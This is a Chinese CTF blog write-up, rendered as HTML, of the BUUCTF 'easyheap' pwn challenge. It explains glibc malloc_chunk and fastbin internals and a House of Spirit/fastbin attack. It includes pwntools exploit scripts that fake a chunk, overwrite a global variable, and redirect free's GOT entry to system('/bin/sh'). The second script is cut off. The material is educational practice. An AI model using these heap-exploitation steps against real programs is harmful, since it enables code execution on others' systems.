@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题目分析  main函数    menu函数  由main函数和menu函数可知，选择不同的选项可以进行申请堆块、向堆块内写入数据、删除堆块、退出等操作。   申请堆块    编辑堆块    删除堆块  可以看出在编辑堆块（向指定堆块写入数据）的时候可以指定写入数据的位数，存在堆溢出漏洞。   后门函数（不知道能不能用）  后门函数的触发条件是使magic变量的值&gt;0x1305，本题目将申请">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu-easyheap">
+<meta property="og:url" content="http://example.com/2021/07/08/buu-easyheap/index.html">
+<meta property="og:site_name" content="Y">
+<meta property="og:description" content="题目分析  main函数    menu函数  由main函数和menu函数可知，选择不同的选项可以进行申请堆块、向堆块内写入数据、删除堆块、退出等操作。   申请堆块    编辑堆块    删除堆块  可以看出在编辑堆块（向指定堆块写入数据）的时候可以指定写入数据的位数，存在堆溢出漏洞。   后门函数（不知道能不能用）  后门函数的触发条件是使magic变量的值&gt;0x1305，本题目将申请">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/main.png">
+<meta property="og:image" content="d:/Desktop/CTF/TK/BUU/pwn/easyheap/menu.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/creat.png">
+<meta property="og:image" content="d:/Desktop/CTF/TK/BUU/pwn/easyheap/edit.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/del.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/l33t.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/magic.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/heaparry.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fastbin1.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fastbin2.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fastbin3.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fastbin4.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fackchunk.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/fuck.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/checksec.png">
+<meta property="og:image" content="http://example.com/2021/07/08/buu-easyheap/binsh.png">
+<meta property="og:image" content="https://img1.doubanio.com/view/group_topic/l/public/p363316808.webp">
+<meta property="article:published_time" content="2021-07-08T13:52:15.000Z">
+<meta property="article:modified_time" content="2021-07-08T13:55:33.062Z">
+<meta property="article:author" content="yang">
+<meta property="article:tag" content="buu">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="fastbin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/08/buu-easyheap/main.png">
+
+<link rel="canonical" href="http://example.com/2021/07/08/buu-easyheap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buu-easyheap | Y</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">dont know write what</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/08/buu-easyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yang">
+      <meta itemprop="description" content="it is funny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buu-easyheap
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-08 21:52:15 / 修改时间：21:55:33" itemprop="dateCreated datePublished" datetime="2021-07-08T21:52:15+08:00">2021-07-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/pwn/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/pwn/heap/fastbin/" itemprop="url" rel="index"><span itemprop="name">fastbin</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><img src="/2021/07/08/buu-easyheap/main.png"></p>
+<blockquote>
+<p>main函数</p>
+</blockquote>
+<p><img src="D:\Desktop\CTF\TK\BUU\pwn\easyheap\menu.png"></p>
+<blockquote>
+<p>menu函数</p>
+</blockquote>
+<p>由main函数和menu函数可知，选择不同的选项可以进行申请堆块、向堆块内写入数据、删除堆块、退出等操作。</p>
+<p><img src="/2021/07/08/buu-easyheap/creat.png"></p>
+<blockquote>
+<p>申请堆块</p>
+</blockquote>
+<p><img src="D:\Desktop\CTF\TK\BUU\pwn\easyheap\edit.png"></p>
+<blockquote>
+<p>编辑堆块</p>
+</blockquote>
+<p><img src="/2021/07/08/buu-easyheap/del.png"></p>
+<blockquote>
+<p>删除堆块</p>
+</blockquote>
+<p>可以看出在编辑堆块（向指定堆块写入数据）的时候可以指定写入数据的位数，存在堆溢出漏洞。</p>
+<p><img src="/2021/07/08/buu-easyheap/l33t.png"></p>
+<blockquote>
+<p>后门函数（不知道能不能用）</p>
+</blockquote>
+<p>后门函数的触发条件是使magic变量的值&gt;0x1305，本题目将申请下来的堆块的初始地址都存在了heaparry数组中，magic变量在heaparry数组前面</p>
+<p><img src="/2021/07/08/buu-easyheap/magic.png"></p>
+<blockquote>
+<p>magic变量和heaparry数组</p>
+</blockquote>
+<p><img src="/2021/07/08/buu-easyheap/heaparry.png"></p>
+<blockquote>
+<p>申请了一个堆块之后的heaparry</p>
+</blockquote>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>既然题目给了后门函数，想办法调用它应该就能getflag。。吧</p>
+<p>想要修改magic变量的值，就要想办法在magic前伪造一个堆块，分配到此堆块之后再对其进行溢出覆盖magic变量。完成这个操作前，需要先稍微了解一下malloc_chunk和fastbin的结构</p>
+<h2 id="malloc-chunk-amp-fastbin"><a href="#malloc-chunk-amp-fastbin" class="headerlink" title="malloc_chunk&amp;fastbin"></a>malloc_chunk&amp;fastbin</h2><h3 id="malloc概述"><a href="#malloc概述" class="headerlink" title="malloc概述"></a>malloc概述</h3><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p>
+<p>非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p>
+<p>malloc_chunk 的结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>每个字段的具体的解释如下</p>
+<ul>
+<li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li>
+<li>size，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul>
+<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
+<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
+<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
+</ul>
+</li>
+<li>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul>
+<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
+<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
+<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
+</ul>
+</li>
+<li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
+<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
+</ul>
+</li>
+</ul>
+<p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p>
+<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin</p>
+<p>fastbins是管理在malloc_state结构体中的一串单向链表，分为0x20-0x80共7个链表（默认情况下）。每个表头对应一个长度不超过4个的单向链表。如图所示</p>
+<p><img src="/2021/07/08/buu-easyheap/fastbin1.png"></p>
+<ul>
+<li>每次释放对应大小的堆块都会被连入对应大小的链表中（链表长度&lt;4）。</li>
+<li>每次分配会优先从fastbins中分配对应大小的区块。</li>
+<li>chunk被放入fastbin时，fd指针指向上一个被放入fastbin的chunk</li>
+<li>fastbin 范围的 chunk 的 inuse 始终被置为 1</li>
+</ul>
+<p>从fastbins中malloc一个freechunk时，glibc会做两个检测:</p>
+<ul>
+<li>检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内</li>
+<li>检测你这个freechunk的size成员的PREV_INUSE是否为1，为1才能通过检测</li>
+</ul>
+<p><img src="/2021/07/08/buu-easyheap/fastbin2.png"></p>
+<h4 id="House-of-Spirit-fastbin-attack"><a href="#House-of-Spirit-fastbin-attack" class="headerlink" title="House of Spirit(fastbin attack)"></a>House of Spirit(fastbin attack)</h4><p>House of Spirit实现的最终效果，也是使攻击者构造的伪chunk通过fastbin被malloc返回。House of Spirit是通过篡改free的目标地址，将伪chunk放入fastbin，进而使随后的malloc返回此伪chunk</p>
+<p><img src="/2021/07/08/buu-easyheap/fastbin3.png"></p>
+<blockquote>
+<p>伪造前</p>
+</blockquote>
+<p><img src="/2021/07/08/buu-easyheap/fastbin4.png"></p>
+<blockquote>
+<p>伪造后</p>
+</blockquote>
+<p>伪造成功后只要malloc两次相应大小的chunk就可以分配到伪造的堆块</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>在magic变量前伪造一个堆块，申请一个在fastbin大小范围内的堆块，free掉之后将其fd修改为伪造的堆块的地址（将伪造的堆块放入fastbin）</li>
+<li>molloc相应大小的堆块两次，分配到伪造的堆块，通过溢出来改写magic的值</li>
+</ol>
+<p>找到开头为0x7f的数据用来构造堆块即可绕过分配时的检测。（将0x7f构造为chunk的size）首先0x20&lt;0x7f&lt;0x80，然后0x7f的二进制表示为01111111最后一个bit(PREV_SIZE)为1。</p>
+<p><img src="/2021/07/08/buu-easyheap/fackchunk.png"></p>
+<blockquote>
+<p>在地址0x6020ad处找到可以完美构造chunk的数据。</p>
+</blockquote>
+<p>因为要伪造的chunk的size为0x7f所以我们申请的堆块的size应该为0x71（0x60的userdata，0x10的prev_size和size，size最后一位为1）；</p>
+<p>首先申请两个size为0x71的堆块，第一个用来溢出修改第二个堆块的fd，第二个用来free到fastbin里；free掉chunk1，再编辑chunk0，将伪造的chunk地址写入chunk1的fd；再次申请两次size为0x71的堆块，第二次申请到的chunk就是伪造的chunk，编辑伪造的chunk，计算好偏移，修改magic变量的值，wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">fackchunk=<span class="number">0x6020ad</span></span><br><span class="line">magic=<span class="number">0x6020C0</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#malloc chunk 0</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#malloc chunk 1</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&quot;1&quot;</span>) <span class="comment"># free chunk1</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;120&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">13</span> </span><br><span class="line">payload+=p64(<span class="number">0x71</span>) </span><br><span class="line">payload+=p64(fackchunk) </span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,payload) </span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#malloc chunk 1</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#malloc chunk 2(fackchunk)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;120&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*(magic-fackchunk-<span class="number">0x10</span>)+p64(<span class="number">0x1306</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,payload) </span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;4869&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/07/08/buu-easyheap/fuck.png"></p>
+<p>功夫不负有心人，一番努力之后发现这个后门是假的😅</p>
+<p>不过好歹给了system函数的地址，checksec发现RELRO没有全开，got表可以写</p>
+<p><img src="/2021/07/08/buu-easyheap/checksec.png"></p>
+<p>思路改为：</p>
+<ol>
+<li>在heaparray数组前伪造一个堆块，申请一个在fastbin大小范围内的堆块，free掉之后将其fd修改为伪造的堆块的地址（将伪造的堆块放入fastbin）</li>
+<li>molloc相应大小的堆块两次，分配到伪造的堆块，通过溢出来改写heaparry中的第一个值（chunk 0的地址）为free函数的got地址(got表中储存了free的真实地址)</li>
+<li>此时编辑chunk 0就会往free的got里写入数据，将system函数的地址写入。</li>
+<li>编辑chunk 1，写入”/bin/sh”</li>
+<li>此时删除chunk 1（free(chunk 1)）就会执行system(“/bin/sh”)</li>
+</ol>
+<p>伪造chunk步骤和上面相同；</p>
+<p>首先申请两个size为0x71的堆块，第一个用来溢出修改第二个堆块的fd，第二个用来free到fastbin里；free掉chunk1，再编辑chunk0，将伪造的chunk地址写入chunk1的fd；再次申请两次size为0x71的堆块，第二次申请到的chunk就是伪造的chunk，编辑伪造的chunk，计算好偏移，修改heaparray[0]的值为free_got，</p>
+<p>编辑chunk 0即可编辑free_got内的内容，写入system地址，再编辑chunk 1，写入字符串”/bin/sh”，释放chunk 1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">fackchunk=<span class="number">0x6020ad</span></span><br><span class="line">heappoint=<span class="number">0x6020E0</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">offset=heappoint-(fackchunk+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#heap0</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#heap1</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free heap1</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#override heap1</span></span><br><span class="line">pay=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x71</span>)+p64(fackchunk)+p64(<span class="number">0</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&#x27;1000&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#heap1</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="string">&quot;96&quot;</span>)</span><br><span 